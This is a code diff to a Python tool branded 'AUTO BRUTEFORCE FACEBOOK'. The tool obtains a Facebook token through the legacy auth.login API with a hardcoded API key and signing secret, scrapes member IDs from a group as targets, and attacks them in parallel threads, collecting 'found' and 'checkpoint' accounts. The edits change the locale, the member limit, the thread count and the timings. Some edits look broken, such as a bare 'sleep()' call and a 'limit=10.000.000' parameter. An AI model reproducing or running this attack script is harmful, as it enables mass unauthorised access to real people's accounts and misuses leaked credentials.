@@ -35,8 +35,8 @@ def get(email,pasw):
 	print("%s[*]%s generate access token ..."%(P,W))
 	b = open("cookie/token.log","w")
 	try:
-		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=2locale=id_IDmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"2","locale":"id_ID","method":"auth.login","password":pasw,"return_ssl_resources":"0","v":"1.0"}
+		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=us_USmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"us_US","method":"auth.login","password":pasw,"return_ssl_resources":"0","v":"1.0"}
 		x = hashlib.new('md5')
 		x.update(sig.encode("utf-8"))
 		data.update({'sig':x.hexdigest()})
@@ -93,7 +93,7 @@ def menu(n,toket):
 		except KeyError:
 			exit("%s[!]%s ups sorry group not found !!"%(R,W))
 		print("%s[*]%s from : %s"%(P,W,e))
-		for y in s.get(url.format(idg+"/members?fields=name,id&limit=5000&access_token=%s"%(toket))).json()["data"]:
+		for y in s.get(url.format(idg+"/members?fields=name,id&limit=10.000.000&access_token=%s"%(toket))).json()["data"]:
 			target.append(y["id"])
 	elif unikers in ["0"]:
 		os.system("rm -rf cookie")
@@ -103,7 +103,7 @@ def menu(n,toket):
 		
 	print("%s[*]%s Tunggu sebentar..."%(P,W))
 	
-	m = ThreadPool(30)
+	m = ThreadPool(25)
 	m.map(x,target)
 	result(found,checkpoint)
 	exit("%s\n[+] %sSelesai... "%(R,W))
@@ -146,7 +146,7 @@ def cek():
 	global toket
 	banner()
 	print("%s[*]%s load access token"%(P,W))
-	sleep(2)
+	sleep(1)
 	try:
 		os.mkdir("cookie")
 	except:
@@ -155,7 +155,7 @@ def cek():
 		toket = open("cookie/token.log","r").read()
 	except OSError:
 		print("%s[×] %sups sorry token not found !!"%(R,W))
-		sleep(0.1)
+		sleep(1)
 		login()
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
@@ -166,7 +166,7 @@ def cek():
 	except KeyError:
 		os.system("rm -rf cookie/token.log")
 		print("%s[×] %sups sorry your access token invalid !!"%(R,W))
-		sleep(1)
+		sleep()
 		login()
 	except requests.exceptions.ConnectionError:
 		exit("%s[!] %sups no connection !!"%(R,W))
@@ -182,9 +182,9 @@ def banner():
 	print("""
 %s[+]%s====== %sAUTO BRUTEFORCE FACEBOOK%s ======%s[+]%s
 ╭══════════════════════════════════════════╮
-║%s# %sCopyright : %sSAN-Brother Team%s %s ║
-║%s# %sCreated Date     : %s10-09-19%s  %s ║
-║%s# %sRepositories     : %sV.0.1.0 Beta%s%s║
+║%s# %sCopyright : %sSAN-Brother Team%s %s                         ║
+║%s# %sCreated Date     : %s10-09-19%s  %s                         ║
+║%s# %sRepositories     : %sV.0.1.0 Beta%s%s                       ║
 ╰══════════════════════════════════════════╯
  """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W))
 cek()
